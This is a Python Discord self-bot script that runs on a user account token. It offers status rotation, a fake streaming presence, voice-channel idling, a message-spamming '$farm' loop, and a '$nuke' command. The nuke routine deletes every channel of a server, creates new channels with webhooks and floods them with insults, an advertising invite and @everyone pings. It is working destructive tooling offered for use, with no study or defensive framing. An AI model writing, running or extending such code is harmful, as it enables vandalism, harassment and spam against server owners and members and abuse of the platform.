import requests
import time
import random
import signal
import sys
import threading
import json
import string

try:
    import websocket
except ImportError:
    websocket = None


def check_token(token):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    if response.status_code == 200:
        data = response.json()
        username = data.get("username")
        discriminator = data.get("discriminator")
        user_id = data.get("id")
        if discriminator and discriminator != "0":
            return f"{username}#{discriminator}", user_id
        return username, user_id
    return None, None


def get_current_custom_status(token):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    response = requests.get("https://discord.com/api/v9/users/@me/settings", headers=headers)
    if response.status_code == 200:
        return response.json().get("custom_status", None)
    return None


def change_custom_status(token, text):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    payload = {"custom_status": {"text": text}}
    requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload)


def restore_custom_status(token, original):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    payload = {"custom_status": original}
    requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload)


def delete_message(token, channel_id, message_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        requests.delete(
            f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}",
            headers=headers, timeout=10
        )
    except requests.RequestException:
        pass


def edit_message(token, channel_id, message_id, content):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        requests.patch(
            f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}",
            headers=headers, json={"content": content}, timeout=10
        )
    except requests.RequestException:
        pass


def send_message(token, channel_id, content):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.post(
            f"https://discord.com/api/v9/channels/{channel_id}/messages",
            headers=headers, json={"content": content}, timeout=10
        )
        if r.status_code == 200:
            return r.json().get("id")
    except requests.RequestException:
        pass
    return None


def get_channel_info(token, channel_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.get(
            f"https://discord.com/api/v9/channels/{channel_id}",
            headers=headers, timeout=10
        )
        if r.status_code == 200:
            return r.json()
    except requests.RequestException:
        pass
    return None


def load_config():
    config = {}
    with open("config.txt", "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if "=" in line:
                key, value = line.split("=", 1)
                config[key.strip()] = value.strip()
    return config


def load_custom_statuses():
    try:
        with open("customstatus.txt", "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
        return lines
    except FileNotFoundError:
        return []


def load_stream_config():
    config = {}
    try:
        with open("stream.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and "=" in line:
                    key, value = line.split("=", 1)
                    config[key.strip()] = value.strip()
    except FileNotFoundError:
        return None
    return config


def get_external_asset(token, app_id, url):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.post(
            f"https://discord.com/api/v9/applications/{app_id}/external-assets",
            headers=headers, json={"urls": [url]}, timeout=10
        )
        if r.status_code == 200:
            data = r.json()
            if data:
                return f"mp:{data[0]['external_asset_path']}"
    except requests.RequestException:
        pass
    return None


def build_activity(sc, app_id, token):
    activity = {
        "name": sc.get("line1", "Streaming") or "Streaming",
        "type": 1,
        "url": sc.get("stream_url", "https://twitch.tv/discord"),
        "timestamps": {"start": int(time.time())}
    }

    if sc.get("line2"):
        activity["details"] = sc["line2"]
    if sc.get("line3"):
        activity["state"] = sc["line3"]

    image_url = sc.get("image_url", "")
    if image_url:
        if image_url.startswith("http") and app_id:
            external = get_external_asset(token, app_id, image_url)
            if external:
                image_url = external
        activity["assets"] = {
            "large_image": image_url,
            "large_text": sc.get("line1", "")
        }

    if app_id:
        activity["application_id"] = app_id

    return activity


RANDOM_EMOJIS = ["😂", "🔥", "💀", "😭", "🐧", "🌸", "💯", "🎉", "😎", "🤡", "👾", "🫡", "🥶", "🤣", "😈"]


def random_farm_message():
    chars = random.choices(string.ascii_lowercase + string.digits, k=10)
    random_str = "".join(chars)
    emojis = "".join(random.choices(RANDOM_EMOJIS, k=5))
    return f"tuanhaidz {random_str} {emojis}"


def farm_loop(token, channel_id, stop_event):
    while not stop_event.is_set():
        for _ in range(4):
            if stop_event.is_set():
                return
            send_message(token, channel_id, random_farm_message())
            time.sleep(0.5)
        stop_event.wait(5)


def resolve_invite(token, invite_code):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.get(
            f"https://discord.com/api/v9/invites/{invite_code}?with_counts=true",
            headers=headers, timeout=10
        )
        if r.status_code == 200:
            return r.json()
    except requests.RequestException:
        pass
    return None


def get_guild_channels(token, guild_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.get(
            f"https://discord.com/api/v9/guilds/{guild_id}/channels",
            headers=headers, timeout=10
        )
        if r.status_code == 200:
            return r.json()
    except requests.RequestException:
        pass
    return None


def get_guild_name(token, guild_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.get(
            f"https://discord.com/api/v9/guilds/{guild_id}",
            headers=headers, timeout=10
        )
        if r.status_code == 200:
            return r.json().get("name", "Unknown")
    except requests.RequestException:
        pass
    return "Unknown"


def delete_channel(token, channel_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.delete(
            f"https://discord.com/api/v9/channels/{channel_id}",
            headers=headers, timeout=10
        )
        return r.status_code in (200, 204)
    except requests.RequestException:
        return False


def create_channel(token, guild_id, name):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.post(
            f"https://discord.com/api/v9/guilds/{guild_id}/channels",
            headers=headers, json={"name": name, "type": 0}, timeout=10
        )
        if r.status_code in (200, 201):
            return r.json()
    except requests.RequestException:
        pass
    return None


def create_webhook(token, channel_id, name):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.post(
            f"https://discord.com/api/v9/channels/{channel_id}/webhooks",
            headers=headers, json={"name": name}, timeout=10
        )
        if r.status_code in (200, 201):
            data = r.json()
            return f"https://discord.com/api/webhooks/{data['id']}/{data['token']}"
    except requests.RequestException:
        pass
    return None


def spam_webhook(url, content):
    while True:
        try:
            r = requests.post(url, json={"content": content}, timeout=10)
            if r.status_code == 404:
                break
            if r.status_code == 429:
                retry = r.json().get("retry_after", 0.1)
                time.sleep(retry)
        except requests.RequestException:
            break


def nuke_server(token, guild_id, ad_invite):
    print("[*] Nuking server...")

    spam_content = (
        "# your trash server got fucked by tuanhai dz 😭😂cry and report it to your mom\n"
        "# tuanhai on top | little rat cry now 😂\n"
        f"{ad_invite}\n"
        f"{ad_invite}\n"
        f"{ad_invite}\n"
        f"{ad_invite}\n"
        "@everyone"
    )

    channel_names = ["".join(random.choices(string.ascii_lowercase + string.digits, k=20)) for _ in range(6)]
    create_index = [0]
    lock = threading.Lock()
    spam_threads = []

    def delete_all_channels():
        channels = get_guild_channels(token, guild_id)
        if channels:
            for ch in channels:
                delete_channel(token, ch["id"])
        print("[+] Deleted all channels")

    def create_and_spam():
        while True:
            with lock:
                if create_index[0] >= len(channel_names):
                    break
                idx = create_index[0]
                create_index[0] += 1
            name = channel_names[idx]
            ch = create_channel(token, guild_id, name)
            if ch:
                print(f"[+] Created #{name}")
                wh = create_webhook(token, ch["id"], "tuanhaideptrai")
                if wh:
                    print(f"[+] Webhook created in #{name}")
                    t = threading.Thread(target=spam_webhook, args=(wh, spam_content), daemon=True)
                    t.start()
                    spam_threads.append(t)

    delete_thread = threading.Thread(target=delete_all_channels, daemon=True)
    delete_thread.start()

    create_threads = []
    for _ in range(3):
        t = threading.Thread(target=create_and_spam, daemon=True)
        t.start()
        create_threads.append(t)

    delete_thread.join()

    for t in create_threads:
        t.join()

    for t in spam_threads:
        t.join()

    print("[+] Nuke completed")


class DiscordGateway:
    def __init__(self, token, user_id, activity=None):
        self.token = token
        self.user_id = user_id
        self.activity = activity
        self.ws = None
        self.heartbeat_interval = None
        self.sequence = None
        self.running = True
        self.current_voice = None
        self.pending_live = None
        self.session_id = None
        self.farm_stop_event = None
        self.farm_thread = None
        self.farm_channel = None

    def start(self):
        t = threading.Thread(target=self._run, daemon=True)
        t.start()

    def _run(self):
        while self.running:
            try:
                self.ws = websocket.WebSocket()
                self.ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
                hello = json.loads(self.ws.recv())
                self.heartbeat_interval = hello["d"]["heartbeat_interval"] / 1000
                t = threading.Thread(target=self._heartbeat, daemon=True)
                t.start()
                self._identify()
                while self.running:
                    msg = self.ws.recv()
                    if msg:
                        data = json.loads(msg)
                        if data.get("s"):
                            self.sequence = data["s"]
                        self._handle_event(data)
            except Exception:
                if self.running:
                    time.sleep(5)

    def _heartbeat(self):
        while self.running:
            try:
                time.sleep(self.heartbeat_interval)
                if self.ws and self.running:
                    self.ws.send(json.dumps({"op": 1, "d": self.sequence}))
            except:
                break

    def _identify(self):
        payload = {
            "op": 2,
            "d": {
                "token": self.token,
                "properties": {
                    "os": "windows",
                    "browser": "Discord Client",
                    "device": ""
                },
                "presence": {
                    "activities": [self.activity] if self.activity else [],
                    "status": "online",
                    "since": 0,
                    "afk": False
                }
            }
        }
        self.ws.send(json.dumps(payload))

    def join_voice(self, guild_id, channel_id):
        try:
            self.pending_live = {"guild_id": guild_id, "channel_id": channel_id}
            payload = {
                "op": 4,
                "d": {
                    "guild_id": guild_id,
                    "channel_id": channel_id,
                    "self_mute": True,
                    "self_deaf": True
                }
            }
            self.ws.send(json.dumps(payload))
            self.current_voice = {"guild_id": guild_id, "channel_id": channel_id}
            return True
        except:
            self.pending_live = None
            return False

    def start_fake_live(self, guild_id, channel_id):
        try:
            payload = {
                "op": 4,
                "d": {
                    "guild_id": guild_id,
                    "channel_id": channel_id,
                    "self_mute": True,
                    "self_deaf": True,
                    "self_stream": True,
                    "self_video": False
                }
            }
            self.ws.send(json.dumps(payload))

            stream_payload = {
                "op": 18,
                "d": {
                    "type": "guild",
                    "guild_id": guild_id,
                    "channel_id": channel_id,
                    "preferred_region": "singapore"
                }
            }
            self.ws.send(json.dumps(stream_payload))

            time.sleep(0.5)

            video_payload = {
                "op": 4,
                "d": {
                    "guild_id": guild_id,
                    "channel_id": channel_id,
                    "self_mute": True,
                    "self_deaf": True,
                    "self_stream": True,
                    "self_video": True
                }
            }
            self.ws.send(json.dumps(video_payload))
        except:
            pass

    def _handle_event(self, data):
        event = data.get("t")
        d = data.get("d")
        if not d:
            return

        if event == "READY":
            self.session_id = d.get("session_id")

        if event == "VOICE_STATE_UPDATE":
            if d.get("user_id") == self.user_id:
                if d.get("channel_id") and self.pending_live:
                    guild_id = self.pending_live["guild_id"]
                    channel_id = self.pending_live["channel_id"]
                    self.pending_live = None
                    self.start_fake_live(guild_id, channel_id)
                if not d.get("channel_id") and self.current_voice:
                    print("[*] Left voice channel.")
                    self.current_voice = None
                    self.pending_live = None

        if event == "MESSAGE_CREATE":
            author = d.get("author", {})
            if author.get("id") != self.user_id:
                return
            content = d.get("content", "").strip()
            channel_id = d.get("channel_id")
            message_id = d.get("id")
            guild_id = d.get("guild_id")

            if content == "$menu":
                menu_content = (
                    f"## Super Self Bot - Tuan Hai\n\n"
                    f"**🛠️ Commands** :\n"
                    f"`$voice [channel id]` : Join Voice Channel and Keep it online\n"
                    f"`$farm` : Spam Message to get exp for OWO or another bot\n"
                    f"`$nuke [invite]` : Nuke the server\n\n"
                    f"<@{self.user_id}>"
                )
                edit_message(self.token, channel_id, message_id, menu_content)

            elif content == "$farm":
                delete_message(self.token, channel_id, message_id)
                if self.farm_thread and self.farm_thread.is_alive():
                    self.farm_stop_event.set()
                    self.farm_thread.join()
                    self.farm_stop_event = None
                    self.farm_thread = None
                    self.farm_channel = None
                    print("[+] Stopped Farm")
                else:
                    self.farm_stop_event = threading.Event()
                    self.farm_channel = channel_id
                    self.farm_thread = threading.Thread(
                        target=farm_loop,
                        args=(self.token, channel_id, self.farm_stop_event),
                        daemon=True
                    )
                    self.farm_thread.start()
                    print("[+] Started Farm")

            elif content.startswith("$nuke "):
                delete_message(self.token, channel_id, message_id)

                if not guild_id:
                    print("Cannot nuke in DM")
                    return

                parts = content.split(" ", 1)
                if len(parts) < 2 or not parts[1].strip():
                    print("Cannot find invite")
                    return

                invite_input = parts[1].strip()
                invite_code = invite_input.replace("https://discord.gg/", "").replace("https://discord.com/invite/", "").replace("discord.gg/", "")

                invite_data = resolve_invite(self.token, invite_code)
                if not invite_data:
                    print(f"Cannot find invite {invite_input}")
                    return

                ad_invite = f"https://discord.gg/{invite_code}"

                channels = get_guild_channels(self.token, guild_id)
                if channels is None:
                    print("Cannot access this server (missing permissions)")
                    return

                guild_name = get_guild_name(self.token, guild_id)

                print(f"[+] Nuking {guild_name} ({guild_id})")
                t = threading.Thread(
                    target=nuke_server,
                    args=(self.token, guild_id, ad_invite),
                    daemon=True
                )
                t.start()

            elif content.startswith("$voice "):
                delete_message(self.token, channel_id, message_id)
                parts = content.split(" ", 1)
                if len(parts) < 2 or not parts[1].strip():
                    return

                voice_channel_id = parts[1].strip()

                if not guild_id:
                    return

                channel_info = get_channel_info(self.token, voice_channel_id)
                if not channel_info:
                    print(f"Cannot find channel {voice_channel_id}")
                    return

                if channel_info.get("type") not in (2, 13):
                    print(f"Cannot find voice channel {voice_channel_id}")
                    return

                if channel_info.get("guild_id") != guild_id:
                    print(f"Cannot find channel {voice_channel_id} in this server")
                    return

                channel_name = channel_info.get("name", "Unknown")

                if self.join_voice(guild_id, voice_channel_id):
                    print(f"[+] Joined voice: {channel_name} ({voice_channel_id})")

    def stop(self):
        if self.farm_stop_event:
            self.farm_stop_event.set()
        self.running = False
        try:
            if self.ws:
                self.ws.close()
        except:
            pass


def main():
    config = load_config()

    token = config.get("token", "")
    if not token:
        print("Cannot find token in config.txt")
        return

    account_name, user_id = check_token(token)
    if not account_name:
        print("Invalid Token!")
        return

    print(f"Connected | {account_name}")

    auto_custom = config.get("autochangecustomstatus", "False").lower() == "true"
    stream_enabled = config.get("stream", "False").lower() == "true"
    app_id = config.get("application_id", "")

    custom_texts = []
    if auto_custom:
        custom_texts = load_custom_statuses()
        if len(custom_texts) <= 1:
            print("Cannot find enough lines in customstatus.txt (need at least 2)")
            auto_custom = False

    if websocket is None:
        print("Cannot find websocket-client (pip install websocket-client)")
        return

    activity = None
    if stream_enabled:
        if not app_id:
            print("Cannot find application_id in config.txt")
            stream_enabled = False
        else:
            sc = load_stream_config()
            if sc is None:
                print("Cannot find stream.txt")
                stream_enabled = False
            else:
                if not sc.get("stream_url"):
                    print("Cannot find stream_url in stream.txt")
                    stream_enabled = False
                else:
                    if sc.get("image_url") and not sc["image_url"].startswith("http"):
                        print("Cannot find valid image_url in stream.txt")
                    activity = build_activity(sc, app_id, token)
                    print("Stream Mode ON!")

    gateway = DiscordGateway(token, user_id, activity)
    gateway.start()

    original_custom = get_current_custom_status(token) if auto_custom else None

    def restore(sig, frame):
        gateway.stop()
        if auto_custom:
            restore_custom_status(token, original_custom)
        sys.exit(0)

    signal.signal(signal.SIGINT, restore)

    custom_index = 0

    if auto_custom:
        while True:
            change_custom_status(token, custom_texts[custom_index])
            custom_index = (custom_index + 1) % len(custom_texts)
            time.sleep(1)
    else:
        while True:
            time.sleep(1)


if __name__ == "__main__":
    main()